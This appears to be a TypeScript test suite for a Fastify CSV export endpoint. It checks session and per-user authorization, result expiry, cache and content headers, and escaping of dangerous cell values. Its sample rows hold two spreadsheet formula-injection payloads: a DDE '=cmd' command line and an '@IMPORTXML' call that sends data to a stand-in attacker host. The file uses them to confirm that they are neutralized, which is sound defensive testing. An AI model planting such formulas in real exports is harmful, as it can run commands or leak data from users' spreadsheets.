import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import type { FastifyInstance } from "fastify";
import { buildApp } from "../../src/app.js";
import { InMemoryAuthRepository } from "../helpers/in-memory-auth.repo.js";
import { QueryArtifactRepository } from "../../src/modules/generation/query-artifact.repository.js";
import { ExecutionRepository } from "../../src/modules/execution/execution.repository.js";
import { ArtifactGate } from "../../src/modules/execution/artifact-gate.js";
import { ConcurrencyManager } from "../../src/modules/execution/concurrency-manager.js";
import { CancellationService } from "../../src/modules/execution/cancellation.service.js";
import { RestrictedExecutor, type ExecutionResult } from "../../src/modules/execution/restricted-executor.js";
import { AuditLogger } from "../../src/modules/execution/audit-logger.js";
import { ResultCacheService } from "../../src/modules/execution/result-cache.service.js";
import { CsvExporterService } from "../../src/modules/export/csv-exporter.service.js";
import type { ExecutionResultResponse } from "@text2sql/contracts";

describe("Sprint 6 - Task 6: Fastify CSV Export Endpoint (GET /api/v1/executions/:id/export.csv) (US-14)", () => {
    let app: FastifyInstance;
    let authRepo: InMemoryAuthRepository;
    let queryArtifactRepo: QueryArtifactRepository;
    let executionRepo: ExecutionRepository;
    let resultCacheService: ResultCacheService;
    let csvExporterService: CsvExporterService;
    let auditLogger: AuditLogger;

    let userACookie: string;
    let userBCookie: string;
    let userAId: string;
    let userBId: string;

    const sampleResult: ExecutionResultResponse = {
        executionId: "exec_export_alice_01",
        artifactId: "art_export_alice_01",
        status: "completed",
        columns: [
            { name: "id", pgType: "int4", jsType: "number", nullable: false },
            { name: "customer_name", pgType: "varchar", jsType: "string", nullable: false },
            { name: "injection_payload", pgType: "text", jsType: "string", nullable: false },
            { name: "total_revenue", pgType: "numeric", jsType: "number", nullable: true },
        ],
        rows: [
            {
                id: 101,
                customer_name: "Acme Corp",
                injection_payload: "=cmd|' /C calc'!A0",
                total_revenue: 1450.75,
            },
            {
                id: 102,
                customer_name: "Global Logistics, Inc.",
                injection_payload: "@IMPORTXML(\"https://attacker.site/leak\", \"//tr\")",
                total_revenue: 980.0,
            },
        ],
        rowCount: 2,
        byteSize: 320,
        executionTimeMs: 14,
        truncated: false,
        executedAt: new Date().toISOString(),
    };

    before(async () => {
        authRepo = new InMemoryAuthRepository();
        queryArtifactRepo = new QueryArtifactRepository();
        executionRepo = new ExecutionRepository();
        const gate = new ArtifactGate(queryArtifactRepo);
        const concurrencyManager = new ConcurrencyManager();
        const cancellationService = new CancellationService();
        auditLogger = new AuditLogger();
        resultCacheService = new ResultCacheService();
        csvExporterService = new CsvExporterService();

        const mockExecutor = {
            execute: async (): Promise<ExecutionResult> => ({
                ok: true,
                rows: [],
                columns: [],
                rowCount: 0,
                byteSize: 0,
                executionTimeMs: 5,
                truncated: false,
            }),
        } as unknown as RestrictedExecutor;

        app = await buildApp({
            authRepo: authRepo as any,
            queryArtifactRepo,
            executionRepo,
            artifactGate: gate,
            concurrencyManager,
            cancellationService,
            restrictedExecutor: mockExecutor,
            auditLogger,
            resultCacheService,
            csvExporterService,
        });
        await app.ready();

        // Login Analyst Alice
        const loginResA = await app.inject({
            method: "POST",
            url: "/api/auth/login",
            payload: { username: "analyst_a" },
        });
        assert.equal(loginResA.statusCode, 200);
        userACookie = `${loginResA.cookies[0].name}=${loginResA.cookies[0].value}`;
        userAId = JSON.parse(loginResA.payload).user.id;

        // Login Analyst Bob
        const loginResB = await app.inject({
            method: "POST",
            url: "/api/auth/login",
            payload: { username: "analyst_b" },
        });
        assert.equal(loginResB.statusCode, 200);
        userBCookie = `${loginResB.cookies[0].name}=${loginResB.cookies[0].value}`;
        userBId = JSON.parse(loginResB.payload).user.id;
    });

    after(async () => {
        if (app) await app.close();
    });

    describe("1. Authentication & Tenant Authorization Guards", () => {
        it("returns HTTP 401 Unauthorized when request has no session cookie", async () => {
            const res = await app.inject({
                method: "GET",
                url: "/api/v1/executions/exec_any/export.csv",
            });
            assert.equal(res.statusCode, 401);
        });

        it("returns HTTP 403 Forbidden when Analyst Bob attempts to export Analyst Alice's execution", async () => {
            const execId = "exec_alice_protected";
            await executionRepo.create({
                id: execId,
                artifactId: "art_alice_p",
                userId: userAId,
                sqlExecuted: "SELECT 1;",
                status: "completed",
            });
            resultCacheService.setExecutionResult(execId, userAId, "art_alice_p", sampleResult);

            // Bob requests Alice's execution CSV
            const res = await app.inject({
                method: "GET",
                url: `/api/v1/executions/${execId}/export.csv`,
                headers: { cookie: userBCookie },
            });

            assert.equal(res.statusCode, 403);
            const body = JSON.parse(res.payload);
            assert.equal(body.error, "FORBIDDEN");
            assert.match(body.message, /belongs to another user/i);
        });
    });

    describe("2. Execution Existence & Ephemeral TTL Expiration", () => {
        it("returns HTTP 404 Not Found when execution does not exist", async () => {
            const res = await app.inject({
                method: "GET",
                url: "/api/v1/executions/exec_non_existent/export.csv",
                headers: { cookie: userACookie },
            });

            assert.equal(res.statusCode, 404);
            const body = JSON.parse(res.payload);
            assert.equal(body.error, "EXECUTION_NOT_FOUND");
        });

        it("returns HTTP 410 Gone with RESULT_EXPIRED when execution result is older than 15 minutes", async () => {
            const execId = "exec_alice_expired_export";
            await executionRepo.create({
                id: execId,
                artifactId: "art_alice_exp",
                userId: userAId,
                sqlExecuted: "SELECT 1;",
                status: "completed",
            });
            // Seed with 10ms TTL
            resultCacheService.setExecutionResult(execId, userAId, "art_alice_exp", sampleResult, 10);

            // Wait 25ms for expiration
            await new Promise((resolve) => setTimeout(resolve, 25));

            const res = await app.inject({
                method: "GET",
                url: `/api/v1/executions/${execId}/export.csv`,
                headers: { cookie: userACookie },
            });

            assert.equal(res.statusCode, 410);
            const body = JSON.parse(res.payload);
            assert.equal(body.error, "RESULT_EXPIRED");
            assert.match(body.message, /has expired/i);
        });
    });

    describe("3. Happy Path Export & Security Header Verification", () => {
        it("streams neutralized CSV with strict security headers for active owned execution", async () => {
            const execId = "exec_alice_success_export";
            await executionRepo.create({
                id: execId,
                artifactId: "art_alice_succ",
                userId: userAId,
                sqlExecuted: "SELECT 1;",
                status: "completed",
            });
            resultCacheService.setExecutionResult(execId, userAId, "art_alice_succ", sampleResult);

            const res = await app.inject({
                method: "GET",
                url: `/api/v1/executions/${execId}/export.csv`,
                headers: { cookie: userACookie },
            });

            assert.equal(res.statusCode, 200);

            // Verify Headers
            assert.equal(res.headers["content-type"], "text/csv; charset=utf-8");
            assert.equal(res.headers["content-disposition"], `attachment; filename="query-results-${execId}.csv"`);
            assert.equal(res.headers["x-content-type-options"], "nosniff");
            assert.equal(res.headers["cache-control"], "no-store, no-cache, must-revalidate, private");
            assert.equal(res.headers["pragma"], "no-cache");

            // Verify CSV Content
            const rawCsv = res.payload;
            const lines = rawCsv.split("\r\n");

            // Header line
            assert.equal(lines[0], "id,customer_name,injection_payload,total_revenue");

            // Line 1: Verify =cmd payload was neutralized with single quote and wrapped in double quotes
            assert.ok(
                lines[1].includes('"\'=cmd|\' /C calc\'!A0"'),
                `=cmd payload must be neutralized: ${lines[1]}`
            );

            // Line 2: Verify @IMPORTXML payload was neutralized with single quote
            assert.ok(
                lines[2].includes('"\'@IMPORTXML'),
                `@IMPORTXML payload must be neutralized: ${lines[2]}`
            );

            // Line 2: Verify comma in customer name was quoted
            assert.ok(
                lines[2].includes('"Global Logistics, Inc."'),
                `Field with comma must be quoted: ${lines[2]}`
            );
        });

        it("prepends UTF-8 BOM when ?bom=true is requested", async () => {
            const execId = "exec_alice_bom_export";
            await executionRepo.create({
                id: execId,
                artifactId: "art_alice_bom",
                userId: userAId,
                sqlExecuted: "SELECT 1;",
                status: "completed",
            });
            resultCacheService.setExecutionResult(execId, userAId, "art_alice_bom", sampleResult);

            const res = await app.inject({
                method: "GET",
                url: `/api/v1/executions/${execId}/export.csv?bom=true`,
                headers: { cookie: userACookie },
            });

            assert.equal(res.statusCode, 200);
            assert.ok(res.payload.startsWith(CsvExporterService.UTF8_BOM));
            assert.equal(res.rawPayload[0], 0xEF);
            assert.equal(res.rawPayload[1], 0xBB);
            assert.equal(res.rawPayload[2], 0xBF);
        });
    });
});

